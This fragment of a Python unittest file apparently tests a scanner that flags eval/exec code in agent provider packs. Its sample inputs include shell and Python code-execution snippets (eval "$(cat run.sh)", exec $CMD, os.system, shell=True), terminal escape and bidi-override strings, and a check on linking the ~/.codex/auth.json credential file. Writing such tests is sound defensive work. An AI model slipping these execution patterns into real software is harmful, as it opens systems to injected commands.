        self.assertNotIn("SENTINEL-sign-in-content", text)
        self.assertNotIn(home, text)
        self.assertIn("~/.codex/auth.json as auth.json", got[0])

    def eval_flags(self, files, definition=None):
        return [f for f in self.R.scan(self.tree(files), definition)["flags"] if ": eval or exec: " in f]

    def test_the_words_exec_and_eval_in_a_definitions_data_are_not_flagged(self):
        """`codex exec` is a command line in argv and a word of the notes, not code: the shipped codex definition has no eval or exec flag."""
        with open(os.path.join(LIB, "providers", "codex.json")) as f:
            text = f.read()
        self.assertGreaterEqual(text.count("exec"), 8)
        self.assertEqual(self.eval_flags({"definition.json": text}, json.loads(text)), [])
        prose = {"dispatch": {"argv": ["tool", "exec", "--json", "eval", "{clone}"]}, "notes": {"x": "run `tool exec` or tool eval 'a b'; the exec verb (exec mode)"}}
        self.assertEqual(self.eval_flags({"definition.json": json.dumps(prose, indent=1)}, prose), [])

    def test_code_in_a_definitions_data_is_still_flagged(self):
        for label, argv in (("eval of a command substitution", ["sh", "-c", "eval \"$(cat run.sh)\""]), ("exec of a variable", ["sh", "-c", "exec $CMD"]),
                            ("exec of a backquote", ["sh", "-c", "exec `cat x`"]), ("a python exec call", ["python3", "-c", "exec(open('x').read())"]),
                            ("eval with a blank before the call", ["python3", "-c", "eval (x)"]), ("os.system", ["python3", "-c", "import os; os.system('x')"]),
                            ("shell=True", ["python3", "-c", "import subprocess; subprocess.run('x', shell=True)"])):
            with self.subTest(label):
                d = {"dispatch": {"argv": argv}}
                got = self.eval_flags({"definition.json": json.dumps(d, indent=1)}, d)
                self.assertEqual(len(got), 1, got)
                self.assertTrue(got[0].startswith("definition.json:"), got)

    def test_code_in_a_pack_is_flagged_as_before_even_when_it_reads_like_a_command_line(self):
        """Only the definition's data is read as data: a script, another JSON file, or a definition.json below the pack root is code to read."""
        script = "#!/bin/sh\nexec python3 -I \"$0.py\" \"$@\"\ncodex exec --json\n"
        got = self.eval_flags({"definition.json": "{}", "adapter": script, "conformance/fixtures/x.json": "[\"codex\", \"exec\"]\n",
                               "sub/definition.json": "{\"argv\": [\"codex\", \"exec\"]}\n", "run.py": "exec(src)\n"})
        self.assertEqual(sorted(f.split(": ")[0] for f in got), ["adapter:2", "adapter:3", "conformance/fixtures/x.json:1", "run.py:1", "sub/definition.json:1"])

    def test_a_control_character_in_a_run_home_name_is_shown_escaped(self):
        rv, got = self.home_lines({"dispatch": {"home": {"env": "F\x1b[2K", "dir": ".f‮", "link": [{"from": "~/.f/a\x07", "to": "a"}]}}})
        self.assertEqual(got, ["run home (dispatch.home): F\\x1b[2K is RUN/home/.f\\u202e; files of your home linked into it for each run: ~/.f/a\\x07 as a"])


if __name__ == "__main__":
    unittest.main()
